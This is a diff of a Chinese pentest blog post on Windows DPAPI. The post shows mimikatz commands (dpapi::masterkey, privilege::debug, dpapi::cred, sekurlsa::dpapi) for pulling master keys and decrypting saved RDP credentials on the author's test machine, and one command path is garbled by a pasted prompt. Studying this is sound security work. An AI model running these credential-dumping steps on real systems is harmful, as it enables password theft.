@@ -1,503 +1,133 @@
+
 <!DOCTYPE html>
-
-
-
-
-
-
-
-
-
-
-
-
-  
-
-
-<html class="theme-next mist use-motion" lang="zh-CN">
+<html lang="zh-CN" class="loading">
 <head><meta name="generator" content="Hexo 3.9.0">
-  <meta charset="UTF-8">
-<meta http-equiv="X-UA-Compatible" content="IE=edge">
-<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
-<meta name="theme-color" content="#222">
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2">
-
-<link rel="stylesheet" href="/css/main.css?v=6.7.0">
-
-
-  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=6.7.0">
-
-
-  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=6.7.0">
-
-
-  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=6.7.0">
-
-
-  <link rel="mask-icon" href="/images/logo.svg?v=6.7.0" color="#222">
-
-
-
-
-
-
-
-<script id="hexo.configurations">
-  var NexT = window.NexT || {};
-  var CONFIG = {
-    root: '/',
-    scheme: 'Mist',
-    version: '6.7.0',
-    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
-    fancybox: false,
-    fastclick: false,
-    lazyload: false,
-    tabs: true,
-    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
-    algolia: {
-      applicationID: '',
-      apiKey: '',
-      indexName: '',
-      hits: {"per_page":10},
-      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
-    }
-  };
-</script>
-
-
-  
-
-
-
-
-  <meta name="description" content="什么是DPAPIDPAPI(Data Protection Application Programming Interface)是Microsoft为了数据保护提供的一个接口。 应用范围：  IE、Chrome的登录表单自动完成 Powershell加密函数 Outlook, Windows Mail, Windows Mail, 等邮箱客户端的用户密码。 FTP管理账户密码 共享资源文件夹的访问">
-<meta name="keywords" content="内网渗透">
-<meta property="og:type" content="article">
-<meta property="og:title" content="DPAPI学习记录">
-<meta property="og:url" content="http://sherlocz.github.io/2020/06/24/DPAPI学习记录/index.html">
-<meta property="og:site_name" content="Sriracha :)">
-<meta property="og:description" content="什么是DPAPIDPAPI(Data Protection Application Programming Interface)是Microsoft为了数据保护提供的一个接口。 应用范围：  IE、Chrome的登录表单自动完成 Powershell加密函数 Outlook, Windows Mail, Windows Mail, 等邮箱客户端的用户密码。 FTP管理账户密码 共享资源文件夹的访问">
-<meta property="og:locale" content="zh-CN">
-<meta property="og:image" content="http://sherlocz.github.io/2020/06/24/DPAPI学习记录/file.png">
-<meta property="og:image" content="http://sherlocz.github.io/2020/06/24/DPAPI学习记录/cmdkey.png">
-<meta property="og:image" content="http://sherlocz.github.io/2020/06/24/DPAPI学习记录/cred.png">
-<meta property="og:image" content="http://sherlocz.github.io/2020/06/24/DPAPI学习记录/sekurlsa.png">
-<meta property="og:image" content="http://sherlocz.github.io/2020/06/24/DPAPI学习记录/08067.png">
-<meta property="og:image" content="http://sherlocz.github.io/2020/06/24/DPAPI学习记录/cache.png">
-<meta property="og:updated_time" content="2020-06-29T03:28:55.815Z">
-<meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="DPAPI学习记录">
-<meta name="twitter:description" content="什么是DPAPIDPAPI(Data Protection Application Programming Interface)是Microsoft为了数据保护提供的一个接口。 应用范围：  IE、Chrome的登录表单自动完成 Powershell加密函数 Outlook, Windows Mail, Windows Mail, 等邮箱客户端的用户密码。 FTP管理账户密码 共享资源文件夹的访问">
-<meta name="twitter:image" content="http://sherlocz.github.io/2020/06/24/DPAPI学习记录/file.png">
-
-
-
-  <link rel="alternate" href="/atom.xml" title="Sriracha :)" type="application/atom+xml">
-
-
-
-
-  <link rel="canonical" href="http://sherlocz.github.io/2020/06/24/DPAPI学习记录/">
-
-
-
-<script id="page.configurations">
-  CONFIG.page = {
-    sidebar: "",
-  };
-</script>
-
-  <title>DPAPI学习记录 | Sriracha :)</title>
-  
-
-
-
-
-
-
-
-
-
-
-
-
-  <noscript>
-  <style>
-  .use-motion .motion-element,
-  .use-motion .brand,
-  .use-motion .menu-item,
-  .sidebar-inner,
-  .use-motion .post-block,
-  .use-motion .pagination,
-  .use-motion .comments,
-  .use-motion .post-header,
-  .use-motion .post-body,
-  .use-motion .collection-title { opacity: initial; }
-
-  .use-motion .logo,
-  .use-motion .site-title,
-  .use-motion .site-subtitle {
-    opacity: initial;
-    top: initial;
-  }
-
-  .use-motion .logo-line-before i { left: initial; }
-  .use-motion .logo-line-after i { right: initial; }
-  </style>
-</noscript>
-
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+    <meta name="viewport" content="width=device-width, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>DPAPI学习记录 - Sriracha :)</title>
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <meta name="google" content="notranslate">
+    <meta name="keywords" content="TriDiamond Obsidian,"> 
+    <meta name="description" content="什么是DPAPIDPAPI(Data Protection Application Programming Interface)是Microsoft为了数据保护提供的一个接口。
+应用范围：
+
+IE、,"> 
+    <meta name="author" content="sher10ck"> 
+    <link rel="alternative" href="atom.xml" title="Sriracha :)" type="application/atom+xml"> 
+    <link rel="icon" href="/img/favicon.png"> 
+    <link href="https://fonts.loli.net/css?family=Roboto+Mono|Rubik&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="//at.alicdn.com/t/font_1429596_nzgqgvnmkjb.css">
+    <link rel="stylesheet" href="//cdn.bootcss.com/animate.css/3.7.2/animate.min.css">
+    <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/social-share.js/1.0.16/css/share.min.css">
+    <link rel="stylesheet" href="//cdn.bootcss.com/codemirror/5.48.4/codemirror.min.css">
+    <link rel="stylesheet" href="//cdn.bootcss.com/codemirror/5.48.4/theme/dracula.css">
+    <link rel="stylesheet" href="/css/obsidian.css">
+    <link rel="stylesheet" href="/css/ball-atom.min.css">
 </head>
+</html>
 
-<body itemscope itemtype="http://schema.org/WebPage" lang="zh-CN">
-
-  
-  
-    
-  
-
-  <div class="container sidebar-position-left page-post-detail">
-    <div class="headband"></div>
-
-    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
-      <div class="header-inner"><div class="site-brand-wrapper">
-  <div class="site-meta">
-    
-
-    <div class="custom-logo-site-title">
-      <a href="/" class="brand" rel="start">
-        <span class="logo-line-before"><i></i></span>
-        <span class="site-title">Sriracha :)</span>
-        <span class="logo-line-after"><i></i></span>
-      </a>
+<body class="loading">
+    <div class="loader">
+        <div class="la-ball-atom la-2x">
+            <div></div>
+            <div></div>
+            <div></div>
+            <div></div>
+        </div>
     </div>
-    
-      
-        <p class="site-subtitle">Wow, the smell is great!</p>
-      
-    
-    
-  </div>
-
-  <div class="site-nav-toggle">
-    <button aria-label="切换导航栏">
-      <span class="btn-bar"></span>
-      <span class="btn-bar"></span>
-      <span class="btn-bar"></span>
-    </button>
-  </div>
+    <span id="config-title" style="display:none">Sriracha :)</span>
+    <div id="loader"></div>
+    <div id="single">
+    <div class="scrollbar gradient-bg-rev"></div>
+<div id="top" style="display: block;">
+    <div class="bar" style="width: 0;"></div>
+    <div class="navigation animated fadeIn fast delay-1s">
+        <img id="home-icon" class="icon-home" src="/img/favicon.png" alt="" data-url="http://sherlocz.github.io">
+        <div id="play-icon" title="Play/Pause" class="iconfont icon-play"></div>
+        <h3 class="subtitle">DPAPI学习记录</h3>
+        <div class="social">
+            <!--        <div class="like-icon">-->
+            <!--            <a href="javascript:;" class="likeThis active"><span class="icon-like"></span><span class="count">76</span></a>-->
+            <!--        </div>-->
+            <div>
+                <div class="share">
+                    
+                        <a href="javascript:;" class="iconfont icon-share1"></a>
+                        <div class="share-component-cc" data-disabled="facebook,douban,linkedin,diandian,tencent,google"></div>
+                    
+                </div>
+            </div>
+        </div>
+    </div>
 </div>
 
-
-
-<nav class="site-nav">
-  
-    <ul id="menu" class="menu">
-      
-        
-        
-        
-          
-          <li class="menu-item menu-item-home">
-
-    
-    
-    
-      
-    
-
-    
-
-    <a href="/" rel="section"><i class="menu-item-icon fa fa-fw fa-home"></i> <br>首页</a>
-
-  </li>
-        
-        
-        
-          
-          <li class="menu-item menu-item-tags">
-
-    
-    
-    
-      
-    
-
-    
-
-    <a href="/tags/" rel="section"><i class="menu-item-icon fa fa-fw fa-tags"></i> <br>标签</a>
-
-  </li>
-        
-        
-        
-          
-          <li class="menu-item menu-item-archives">
-
-    
-    
-    
-      
-    
-
-    
-
-    <a href="/archives/" rel="section"><i class="menu-item-icon fa fa-fw fa-archive"></i> <br>归档</a>
-
-  </li>
-        
-        
-        
-          
-          <li class="menu-item menu-item-pentest">
-
-    
-    
-    
-      
-    
-
-    
-
-    <a href="/Pentest" rel="section"><i class="menu-item-icon fa fa-fw fa-archive"></i> <br>渗透测试</a>
-
-  </li>
-        
-        
-        
-          
-          <li class="menu-item menu-item-audit">
-
-    
-    
-    
-      
-    
-
-    
-
-    <a href="/Audit" rel="section"><i class="menu-item-icon fa fa-fw fa-archive"></i> <br>代码审计</a>
-
-  </li>
-        
-        
-        
-          
-          <li class="menu-item menu-item-python">
-
-    
-    
-    
-      
-    
-
-    
-
-    <a href="/Python" rel="section"><i class="menu-item-icon fa fa-fw fa-archive"></i> <br>Python</a>
-
-  </li>
-        
-        
-        
-          
-          <li class="menu-item menu-item-about_me">
-
-    
-    
-    
-      
-    
-
-    
-
-    <a href="/About_Me" rel="section"><i class="menu-item-icon fa fa-fw fa-archive"></i> <br>关于我</a>
-
-  </li>
-        
-        
-        
-          
-          <li class="menu-item menu-item-weapon">
-
-    
-    
-    
-      
-    
-
-    
-
-    <a href="/weapon" rel="section"><i class="menu-item-icon fa fa-fw fa-archive"></i> <br>Weapon</a>
-
-  </li>
-
-      
-      
-    </ul>
-  
-
-  
-    
-
-  
-
-  
-</nav>
-
-
-
-  
-
-
-
-</div>
-    </header>
-
-    
-
-
-    <main id="main" class="main">
-      <div class="main-inner">
-        <div class="content-wrap">
-          
-          <div id="content" class="content">
-            
-
-  <div id="posts" class="posts-expand">
-    
-
-  
-
-  
-  
-  
-
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://sherlocz.github.io/2020/06/24/DPAPI学习记录/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="sher10ck">
-      <meta itemprop="description" content>
-      <meta itemprop="image" content="/images/avatar.gif">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Sriracha :)">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">DPAPI学习记录
-
-              
-            
-          </h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-
-            
-            
-            
-
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-
-              
+    <div class="section">
+        <div class=article-header-wrapper>
+    <div class="article-header">
+        <div class="article-cover animated fadeIn" style="
+            animation-delay: 600ms;
+            animation-duration: 1.2s;
+            background-image: 
+                radial-gradient(ellipse closest-side, rgba(0, 0, 0, 0.65), #100e17),
+                url(/img/cover.jpg) ">
+        </div>
+        <div class="else">
+            <p class="animated fadeInDown">
                 
-              
-
-              <time title="创建时间：2020-06-24 16:14:28" itemprop="dateCreated datePublished" datetime="2020-06-24T16:14:28+08:00">2020-06-24</time>
-            
-
-            
-              
-
-              
+                <a href="javascript:;"><b>「 </b>文章<b> 」</b></a>
                 
-                <span class="post-meta-divider">|</span>
+                六月 24, 2020
+            </p>
+            <h3 class="post-title animated fadeInDown"><a href="/2020/06/24/DPAPI学习记录/" title="DPAPI学习记录">DPAPI学习记录</a>
+            </h3>
+            
+            <p class="post-count animated fadeInDown">
                 
-
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-calendar-check-o"></i>
+                <span>
+                    <b class="iconfont icon-text2"></b> <i>文章字数</i>
+                    13k
                 </span>
                 
-                  <span class="post-meta-item-text">更新于</span>
                 
-                <time title="修改时间：2020-06-29 11:28:55" itemprop="dateModified" datetime="2020-06-29T11:28:55+08:00">2020-06-29</time>
-              
+                <span>
+                    <b class="iconfont icon-timer__s"></b> <i>阅读约需</i>
+                    12 mins.
+                </span>
+                
+                
+                
+                <span id="busuanzi_container_page_pv">
+                    <b class="iconfont icon-read"></b> <i>阅读次数</i>
+                    <span id="busuanzi_value_page_pv">0</span>
+                </span>
+                
+            </p>
             
-          </span>
-
-          
-
-          
             
-          
-
-          
-          
-
-          
-
-          
-
-          
-
+            <ul class="animated fadeInDown post-tags-list"><li class="animated fadeInDown post-tags-list-item"><a class="animated fadeInDown post-tags-list-link" href="/tags/内网渗透/">内网渗透</a></li></ul>
+            
         </div>
-      </header>
-    
+    </div>
+</div>
 
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
+<div class="screen-gradient-after">
+    <div class="screen-gradient-content">
+        <div class="screen-gradient-content-inside">
+            <div class="bold-underline-links screen-gradient-sponsor">
+                <p>
+                    <span class="animated fadeIn delay-1s"></span>
+                </p>
+            </div>
+        </div>
+    </div>
+</div>
 
-      
-      
-
-      
-        <h1 id="什么是DPAPI"><a href="#什么是DPAPI" class="headerlink" title="什么是DPAPI"></a>什么是DPAPI</h1><p>DPAPI(Data Protection Application Programming Interface)是Microsoft为了数据保护提供的一个接口。</p>
+<div class="article">
+    <div class='main'>
+        <div class="content markdown animated fadeIn">
+            <h1 id="什么是DPAPI"><a href="#什么是DPAPI" class="headerlink" title="什么是DPAPI"></a>什么是DPAPI</h1><p>DPAPI(Data Protection Application Programming Interface)是Microsoft为了数据保护提供的一个接口。</p>
 <p>应用范围：</p>
 <ul>
 <li>IE、Chrome的登录表单自动完成</li>
@@ -508,465 +138,305 @@
 <li>无线网络帐户密钥和密码</li>
 <li>远程桌面身份凭证</li>
 </ul>
-<h1 id="Master-Key-Files"><a href="#Master-Key-Files" class="headerlink" title="Master Key Files"></a>Master Key Files</h1><p>位置：<strong>%APPDATA%/Microsoft/Protect/%SID%</strong><br>这里我的虚拟机中的masterkeyfile name为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">88536919-3ca5-4e31-a0ac-1ccf6eb94dda</span><br><span class="line">a94e3c00-08e5-4272-8648-f7a796159916</span><br></pre></td></tr></table></figure></p>
+<h1 id="Master-Key-Files"><a href="#Master-Key-Files" class="headerlink" title="Master Key Files"></a>Master Key Files</h1><p>位置：<strong>%APPDATA%/Microsoft/Protect/%SID%</strong><br>这里我的虚拟机中的masterkeyfile name为：<br><figure class="highlight plain"><div class="mdui-table-fluid theme-post__card__table--flat"><table class="mdui-table mdui-table-hoverable "><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">88536919-3ca5-4e31-a0ac-1ccf6eb94dda</span><br><span class="line">a94e3c00-08e5-4272-8648-f7a796159916</span><br></pre></td></tr></table></div></figure></p>
 <p>由于该文件为受保护的，所以我们要勾选掉 <strong>隐藏受保护的操作系统文件</strong></p>
 <p><img src="/2020/06/24/DPAPI学习记录/file.png" alt></p>
-<p>master key file为二进制文件，可以获取文件中的Masterkey破解登陆密码，包含以下五个部分：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Header and system information</span><br><span class="line">User’s Master Key</span><br><span class="line">Local backup encryption key</span><br><span class="line">Unique CREDHIST file identifier</span><br><span class="line">Domain Master Key backup</span><br></pre></td></tr></table></figure></p>
-<p>利用mimikatz对MasterKeyFile进行解析，这里只是解析格式：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">mimikatz(commandline) # dpapi::masterkey /in:C:\Users\swag7\AppData\Roaming\Microsoft\Protect\S-1-5-21-3716468413-4174316740-3893867168-1001\88536919-3ca5-4e31-a0ac-1ccf6eb94dda</span><br><span class="line">**MASTERKEYS**</span><br><span class="line">  dwVersion          : 00000002 - 2</span><br><span class="line">  szGuid             : &#123;88536919-3ca5-4e31-a0ac-1ccf6eb94dda&#125;</span><br><span class="line">  dwFlags            : 00000005 - 5</span><br><span class="line">  dwMasterKeyLen     : 000000b0 - 176</span><br><span class="line">  dwBackupKeyLen     : 00000090 - 144</span><br><span class="line">  dwCredHistLen      : 00000014 - 20</span><br><span class="line">  dwDomainKeyLen     : 00000000 - 0</span><br><span class="line">[masterkey]</span><br><span class="line">  **MASTERKEY**</span><br><span class="line">    dwVersion        : 00000002 - 2</span><br><span class="line">    salt             : 824e5853fe8cc89a609ea3d6fdf63b49</span><br><span class="line">    rounds           : 000043f8 - 17400</span><br><span class="line">    algHash          : 0000800e - 32782 (CALG_SHA_512)</span><br><span class="line">    algCrypt         : 00006610 - 26128 (CALG_AES_256)</span><br><span class="line">    pbKey            : b1509914bf8fafaf32f0686555097ad5f6241061f2857972710a788b3c4dcce9733d7ae5fd45b7c3483a07321e6c0fb047cb06389b0567b6964c7382255d25c1a316a75c6839d7a516540a10c49941b02e3b7d08bcbca8c6ed4362469b9eafbbecca62ac20a03aa9ae739e23d67f2446a77b63b00166c2616ac31de9b59327afa6975f440bb735a95427413c1a209036</span><br><span class="line"></span><br><span class="line">[backupkey]</span><br><span class="line">  **MASTERKEY**</span><br><span class="line">    dwVersion        : 00000002 - 2</span><br><span class="line">    salt             : b9eba682e6a10a6eabe2a671f2a5f970</span><br><span class="line">    rounds           : 000043f8 - 17400</span><br><span class="line">    algHash          : 0000800e - 32782 (CALG_SHA_512)</span><br><span class="line">    algCrypt         : 00006610 - 26128 (CALG_AES_256)</span><br><span class="line">    pbKey            : 07f73eaad338c8f205525bcd76883a9280e646b79fd93fef9b162aaeea97241a03dc6aa5b9f64734d20ad78b6f6d9d4c8aa79a8d03155116c61e5e514e5ed570847f81a2ca904085672de962c687614e72dc9cd62a5c5f2ac89e1643bf3b9612218a4bbe8bfe22304389f6fa155a9790</span><br><span class="line"></span><br><span class="line">[credhist]</span><br><span class="line">  **CREDHIST INFO**</span><br><span class="line">    dwVersion        : 00000003 - 3</span><br><span class="line">    guid             : &#123;bc99ef8c-8b47-4d3c-a316-2daba229d091&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Auto SID from path seems to be: S-1-5-21-3716468413-4174316740-3893867168-1001</span><br></pre></td></tr></table></figure></p>
-<h1 id="破解rdp密码"><a href="#破解rdp密码" class="headerlink" title="破解rdp密码"></a>破解rdp密码</h1><p>首先查看保存的rdp凭据：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmdkey /line</span><br></pre></td></tr></table></figure></p>
+<p>master key file为二进制文件，可以获取文件中的Masterkey破解登陆密码，包含以下五个部分：<br><figure class="highlight plain"><div class="mdui-table-fluid theme-post__card__table--flat"><table class="mdui-table mdui-table-hoverable "><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Header and system information</span><br><span class="line">User’s Master Key</span><br><span class="line">Local backup encryption key</span><br><span class="line">Unique CREDHIST file identifier</span><br><span class="line">Domain Master Key backup</span><br></pre></td></tr></table></div></figure></p>
+<p>利用mimikatz对MasterKeyFile进行解析，这里只是解析格式：<br><figure class="highlight plain"><div class="mdui-table-fluid theme-post__card__table--flat"><table class="mdui-table mdui-table-hoverable "><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">mimikatz(commandline) # dpapi::masterkey /in:C:\Users\swag7\AppData\Roaming\Microsoft\Protect\S-1-5-21-3716468413-4174316740-3893867168-1001\88536919-3ca5-4e31-a0ac-1ccf6eb94dda</span><br><span class="line">**MASTERKEYS**</span><br><span class="line">  dwVersion          : 00000002 - 2</span><br><span class="line">  szGuid             : &#123;88536919-3ca5-4e31-a0ac-1ccf6eb94dda&#125;</span><br><span class="line">  dwFlags            : 00000005 - 5</span><br><span class="line">  dwMasterKeyLen     : 000000b0 - 176</span><br><span class="line">  dwBackupKeyLen     : 00000090 - 144</span><br><span class="line">  dwCredHistLen      : 00000014 - 20</span><br><span class="line">  dwDomainKeyLen     : 00000000 - 0</span><br><span class="line">[masterkey]</span><br><span class="line">  **MASTERKEY**</span><br><span class="line">    dwVersion        : 00000002 - 2</span><br><span class="line">    salt             : 824e5853fe8cc89a609ea3d6fdf63b49</span><br><span class="line">    rounds           : 000043f8 - 17400</span><br><span class="line">    algHash          : 0000800e - 32782 (CALG_SHA_512)</span><br><span class="line">    algCrypt         : 00006610 - 26128 (CALG_AES_256)</span><br><span class="line">    pbKey            : b1509914bf8fafaf32f0686555097ad5f6241061f2857972710a788b3c4dcce9733d7ae5fd45b7c3483a07321e6c0fb047cb06389b0567b6964c7382255d25c1a316a75c6839d7a516540a10c49941b02e3b7d08bcbca8c6ed4362469b9eafbbecca62ac20a03aa9ae739e23d67f2446a77b63b00166c2616ac31de9b59327afa6975f440bb735a95427413c1a209036</span><br><span class="line"></span><br><span class="line">[backupkey]</span><br><span class="line">  **MASTERKEY**</span><br><span class="line">    dwVersion        : 00000002 - 2</span><br><span class="line">    salt             : b9eba682e6a10a6eabe2a671f2a5f970</span><br><span class="line">    rounds           : 000043f8 - 17400</span><br><span class="line">    algHash          : 0000800e - 32782 (CALG_SHA_512)</span><br><span class="line">    algCrypt         : 00006610 - 26128 (CALG_AES_256)</span><br><span class="line">    pbKey            : 07f73eaad338c8f205525bcd76883a9280e646b79fd93fef9b162aaeea97241a03dc6aa5b9f64734d20ad78b6f6d9d4c8aa79a8d03155116c61e5e514e5ed570847f81a2ca904085672de962c687614e72dc9cd62a5c5f2ac89e1643bf3b9612218a4bbe8bfe22304389f6fa155a9790</span><br><span class="line"></span><br><span class="line">[credhist]</span><br><span class="line">  **CREDHIST INFO**</span><br><span class="line">    dwVersion        : 00000003 - 3</span><br><span class="line">    guid             : &#123;bc99ef8c-8b47-4d3c-a316-2daba229d091&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Auto SID from path seems to be: S-1-5-21-3716468413-4174316740-3893867168-1001</span><br></pre></td></tr></table></div></figure></p>
+<h1 id="破解rdp密码"><a href="#破解rdp密码" class="headerlink" title="破解rdp密码"></a>破解rdp密码</h1><p>首先查看保存的rdp凭据：<br><figure class="highlight plain"><div class="mdui-table-fluid theme-post__card__table--flat"><table class="mdui-table mdui-table-hoverable "><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmdkey /line</span><br></pre></td></tr></table></div></figure></p>
 <p><img src="/2020/06/24/DPAPI学习记录/cmdkey.png" alt></p>
-<p>windows保存rdp凭据的位置：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\用户名\AppData\Local\Microsoft\Credentials</span><br></pre></td></tr></table></figure></p>
-<p>我们可以查看该目录下的文件有啥：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\swag7&gt;dir /a C:\Users\swag7\AppData\Local\Microsoft\Credentials\*</span><br><span class="line"> 驱动器 C 中的卷没有标签。</span><br><span class="line"> 卷的序列号是 EA04-9FD7</span><br><span class="line"></span><br><span class="line"> C:\Users\swag7\AppData\Local\Microsoft\Credentials 的目录</span><br><span class="line"></span><br><span class="line">2020/06/29  11:04    &lt;DIR&gt;          .</span><br><span class="line">2020/06/29  11:04    &lt;DIR&gt;          ..</span><br><span class="line">2020/06/29  11:04               434 0584A81C75E5FE36C40B464C8CFBCD0F</span><br><span class="line">               1 个文件            434 字节</span><br><span class="line">               2 个目录 38,597,902,336 可用字节</span><br></pre></td></tr></table></figure></p>
-<p>用管理员权限打开mimikatz，先提个权限：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug</span><br></pre></td></tr></table></figure></p>
-<p>解析rdp凭证文件：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dpapi::cred /in:C:\Users\swag7&gt;dir /a C:\Users\swag7\AppData\Local\Microsoft\Credentials\0584A81C75E5FE36C40B464C8CFBCD0F</span><br></pre></td></tr></table></figure></p>
+<p>windows保存rdp凭据的位置：<br><figure class="highlight plain"><div class="mdui-table-fluid theme-post__card__table--flat"><table class="mdui-table mdui-table-hoverable "><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\用户名\AppData\Local\Microsoft\Credentials</span><br></pre></td></tr></table></div></figure></p>
+<p>我们可以查看该目录下的文件有啥：<br><figure class="highlight plain"><div class="mdui-table-fluid theme-post__card__table--flat"><table class="mdui-table mdui-table-hoverable "><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\swag7&gt;dir /a C:\Users\swag7\AppData\Local\Microsoft\Credentials\*</span><br><span class="line"> 驱动器 C 中的卷没有标签。</span><br><span class="line"> 卷的序列号是 EA04-9FD7</span><br><span class="line"></span><br><span class="line"> C:\Users\swag7\AppData\Local\Microsoft\Credentials 的目录</span><br><span class="line"></span><br><span class="line">2020/06/29  11:04    &lt;DIR&gt;          .</span><br><span class="line">2020/06/29  11:04    &lt;DIR&gt;          ..</span><br><span class="line">2020/06/29  11:04               434 0584A81C75E5FE36C40B464C8CFBCD0F</span><br><span class="line">               1 个文件            434 字节</span><br><span class="line">               2 个目录 38,597,902,336 可用字节</span><br></pre></td></tr></table></div></figure></p>
+<p>用管理员权限打开mimikatz，先提个权限：<br><figure class="highlight plain"><div class="mdui-table-fluid theme-post__card__table--flat"><table class="mdui-table mdui-table-hoverable "><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug</span><br></pre></td></tr></table></div></figure></p>
+<p>解析rdp凭证文件：<br><figure class="highlight plain"><div class="mdui-table-fluid theme-post__card__table--flat"><table class="mdui-table mdui-table-hoverable "><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dpapi::cred /in:C:\Users\swag7&gt;dir /a C:\Users\swag7\AppData\Local\Microsoft\Credentials\0584A81C75E5FE36C40B464C8CFBCD0F</span><br></pre></td></tr></table></div></figure></p>
 <p><img src="/2020/06/24/DPAPI学习记录/cred.png" alt></p>
 <p>获取到guidMasterKey，这里的gmk其实就是我们的master key file名称，位置就在<strong>%APPDATA%/Microsoft/Protect/%SID%</strong>下</p>
-<p>其实这里可以直接用mimikatz读取所有masterkeyfile对应的masterkey，使用命令：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sekurlsa::dpapi</span><br></pre></td></tr></table></figure></p>
